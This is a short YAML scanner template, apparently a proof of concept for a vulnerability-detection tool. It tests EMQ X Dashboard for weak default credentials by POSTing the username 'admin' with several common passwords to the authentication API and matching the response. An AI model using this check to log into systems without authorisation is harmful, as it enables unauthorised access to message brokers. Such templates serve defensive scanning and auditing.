id: poc-yaml-emqx-default-password
info:
  name: EMQ X DashBoard 默认密码漏洞
  severity: high
  tags:
  - 弱口令
  finger: EMQ X DashBoard
  osprey-id: vb_2020_0028
variables:
  v_username: admin
  v_password: 'public

    admin

    123456

    admin123'
requests:
- method: POST
  path: /api/v3/auth
  headers:
    Content-Type: application/json
  data: '{"password": "{{.v_password}}", "username": "{{.v_username}}"}'
  expression: 'status_code == 200 &&

    contains(headers, "Cowboy") &&

    contains(body, "code") &&

    contains(content_type, "json")

    '
transport: http
